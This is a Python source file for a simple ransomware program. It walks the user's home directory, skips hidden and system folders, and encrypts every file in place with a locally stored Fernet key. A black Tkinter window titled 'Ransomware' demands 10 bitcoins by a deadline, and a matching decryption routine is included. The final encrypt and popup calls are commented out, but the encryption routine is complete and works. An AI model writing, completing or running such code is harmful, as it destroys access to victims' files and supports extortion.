import os
from os.path import expanduser
from cryptography.fernet import Fernet
import base64
from bit import PrivateKeyTestnet, Key
import subprocess
import tkinter as tk
from tkinter import messagebox
from tkinter.font import Font

# Home directory
home = expanduser("~")


def generate_key():
        if not os.path.isfile("./key.key"):
                key = Fernet.generate_key()
                with open("key.key", "wb") as the_key:
                        the_key.write(key)


#Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
def list_safe_directories(directory):

        result = []
        excluded_dirs = set(['.', '..', '.Trash-1000', '.config', '.local', '.cache'])


        #Go through all of the directories and exlcude the ones in the excluded_dirs set
        for root, dirs, _ in os.walk(directory):
                dirs[:] = [d for d in dirs if not d.startswith(".") and d not in excluded_dirs]

                for directory in dirs:
                        result.append(os.path.join(root, directory))

        return result  #Return the list of directories



#Method that retrieves all of the files in a directory and purposely does not include the ransomeware
def get_files_in_dir(directory):
        #change to home directory so that the paths are correct relative paths.
        os.chdir(directory)

        files = []
        for file in os.listdir(directory):
                # We do not want to encrypt our own ransomware
                if file == "encryption.py" or file == "key.key":
                        continue
                if os.path.isfile(file):
                        files.append(file)

        return files


#Method for encrypting a single file
def encrypt_file(file, key):
        print("started")
        with open(file, "rb") as the_file:
                contents = the_file.read()

        encrypted_contents = Fernet(key).encrypt(contents)
        with open(file, "wb") as the_file:
                the_file.write(encrypted_contents)
        print("terminated")

#Encrypt all the safe to encrypt files on a victims pc
def encrypt_all_files(directory, key):
        dir_list = list_safe_directories(home)
        for dir in dir_list:
                for file in get_files_in_dir(dir):
                        file_path = os.path.join(dir, file)
                        encrypt_file(file_path, key)
                        print(file)
        print("terminated")
def decrypt_file(file_path, key):
        with open(file_path, 'rb') as file:
                encrypted_contents = file.read()
        try:
                decrypted_contents = Fernet(key).decrypt(encrypted_contents)
                with open(file_path, "wb") as the_file:
                        the_file.write(decrypted_contents)

        except Exception as e:
                print("Decryption error:", e)




def decrypt_all_files(directory, key):
        dir_list = list_safe_directories(home)
        for dir in dir_list:
                for file in get_files_in_dir(dir):
                        file_path = os.path.join(dir, file)
                        decrypt_file(file_path, key)


def display_popup(message):
    subprocess.call(['zenity', '--info', '--text', message])


def submit_button_click():
    entered_text = textbox.get("1.0", "end-1c")  # Retrieve the text from the textbox
    messagebox.showinfo("Submitted", f"You entered: {entered_text}")


# Create the Tkinter window
window = tk.Tk()
window.title("Ransomware")
window.configure(bg="black")  # Set background color to black

# Set custom font style
custom_font = Font(family="Chiller", size=20)
# Create the textbox
textbox = tk.Text(window, height=3, width=20, font=custom_font, bg="gray", fg="white")
textbox.pack(padx=20, pady=20)

# Create the submit button
submit_button = tk.Button(window, text="Send", font=custom_font, command=submit_button_click, bg="red", fg="white")
submit_button.pack(pady=10)


# Create the title label
title_label = tk.Label(window, text="Transfer 10 bitcoins before 10:00", font=custom_font, fg="white", bg="black")
title_label.pack(pady=20)

# Start the Tkinter event loop
window.mainloop()



generate_key()
with open("key.key", 'rb') as key:
        key = key.read()


#encrypt_all_files(home, key)
#display_popup('You have been hacked! Pay us now!')
#decrypt_all_files(home, key)


#print(list_safe_directories(directory))
